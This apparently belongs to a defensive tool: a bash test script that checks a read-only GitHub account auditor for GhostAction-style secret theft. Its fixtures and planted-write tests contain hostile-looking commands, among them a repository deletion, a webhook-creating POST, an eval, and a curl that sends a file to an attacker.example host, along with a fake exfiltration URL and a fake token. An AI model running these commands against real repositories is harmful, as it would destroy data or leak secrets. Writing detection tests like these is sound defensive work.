#!/usr/bin/env bash
# Runs check.sh against made-up accounts (tests/fixtures) with a stand-in for the GitHub CLI
# (tests/bin/gh), so no real account and no network are needed. Needs jq.
# usage: bash tests/run-tests.sh      (set CHECK_BASH=/bin/bash to pick the bash that runs check.sh)

cd "$(dirname "$0")/.." || exit 1
BASH_BIN=${CHECK_BASH:-bash}
PATH="$PWD/tests/bin:$PATH"
export PATH
OUT=$(mktemp -d) || exit 1
trap 'rm -r "$OUT" 2>/dev/null' EXIT
fails=0

ok() { printf '  ok    %s\n' "$1"; }
bad() {
  printf '  FAIL  %s\n' "$1"
  fails=$((fails + 1))
}

# run NAME EXPECTED-EXIT [check.sh options...]
run() {
  local name=$1 want=$2
  shift 2
  FAKE_GH_SCENARIO=$name FAKE_GH_LOG="$OUT/$name.log" "$BASH_BIN" check.sh --quiet "$@" >"$OUT/$name.txt" 2>"$OUT/$name.err"
  local got=$?
  if [ "$got" -eq "$want" ]; then
    ok "$name: exit code $got"
  else
    bad "$name: exit code $got, expected $want"
    sed 's/^/        | /' "$OUT/$name.txt" "$OUT/$name.err" | head -n 80
  fi
  if grep -q '^REFUSED' "$OUT/$name.log" 2>/dev/null; then
    bad "$name: check.sh tried something that is not a plain read"
  fi
}

has() { # has NAME TEXT
  if grep -q -F -e "$2" "$OUT/$1.txt"; then ok "$1: report has \"$2\""; else bad "$1: report lacks \"$2\""; fi
}
hasnot() {
  if grep -q -F -e "$2" "$OUT/$1.txt"; then bad "$1: report must not have \"$2\""; else ok "$1: report has no \"$2\""; fi
}

printf 'bash used for check.sh: %s (%s)\n' "$BASH_BIN" "$("$BASH_BIN" -c 'echo $BASH_VERSION')"

printf '\n1. A quiet, clean account\n'
run clean-quiet 0
has clean-quiet "ACT NOW (0)"
has clean-quiet "CHECK THIS (0)"
has clean-quiet "WHAT THIS DOES NOT PROVE"
has clean-quiet "https://github.com/settings/security-log"
hasnot clean-quiet "is safe"

printf '\n2. An account hit like GhostAction: a new job file that sends out every secret\n'
run ghostaction-like 2
has ghostaction-like "ACT NOW (1)"
has ghostaction-like "octo-user/shop"
has ghostaction-like "github_actions_security.yml"
has ghostaction-like "NPM_TOKEN"
has ghostaction-like "GhostAction"
hasnot ghostaction-like "ghp_ThisValueMustNeverBePrinted"
hasnot ghostaction-like "hooks.attacker.example/secret-path"

printf '\n3. An active but clean account: its own new job file is a question, not an alarm\n'
run clean-active 1
has clean-active "ACT NOW (0)"
has clean-active ".github/workflows/test.yml"
has clean-active "Did you do each of these?"

printf '\n4. GitHub refuses some questions: that is reported, never counted as a pass\n'
run api-errors 0
has api-errors "COULD NOT CHECK"
has api-errors "HTTP 403"

printf '\n5. A hostile name cannot repaint the terminal\n'
if LC_ALL=C grep -q "$(printf '\033')" "$OUT/ghostaction-like.txt"; then
  bad "an escape character reached the report"
else
  ok "no escape characters in the report"
fi

printf '\n6. Options\n'
"$BASH_BIN" check.sh --days 0 >/dev/null 2>&1
[ $? -eq 3 ] && ok "--days 0 is refused with exit 3" || bad "--days 0 should exit 3"
"$BASH_BIN" check.sh --repo 'bad name' >/dev/null 2>&1
[ $? -eq 3 ] && ok "a malformed --repo is refused with exit 3" || bad "a malformed --repo should exit 3"
"$BASH_BIN" check.sh --help >/dev/null 2>&1
[ $? -eq 0 ] && ok "--help works" || bad "--help should exit 0"

printf '\n7. The stand-in refuses writes, and the read-only test catches a planted write\n'
tests/bin/gh api --method POST repos/octo-user/shop/hooks >/dev/null 2>&1
[ $? -eq 97 ] && ok "the stand-in refuses a POST" || bad "the stand-in should refuse a POST"
tests/bin/gh api repos/octo-user/shop -f name=x >/dev/null 2>&1
[ $? -eq 97 ] && ok "the stand-in refuses a field flag" || bad "the stand-in should refuse a field flag"
bash tests/static-readonly.sh check.sh >/dev/null 2>&1 && ok "check.sh passes the read-only test" || bad "check.sh fails the read-only test"
for planted in 'gh api -X DELETE repos/octo-user/shop' 'gh repo delete octo-user/shop --yes' 'ghget --method POST repos/octo-user/shop/hooks' 'curl -d @x https://attacker.example' 'eval "$name"'; do
  cp check.sh "$OUT/planted.sh"
  printf '%s\n' "$planted" >>"$OUT/planted.sh"
  if bash tests/static-readonly.sh "$OUT/planted.sh" >/dev/null 2>&1; then
    bad "the read-only test missed: $planted"
  else
    ok "the read-only test catches: $planted"
  fi
done

printf '\n'
if [ "$fails" -eq 0 ]; then
  printf 'All tests passed.\n'
  exit 0
fi
printf '%s test(s) failed.\n' "$fails"
exit 1
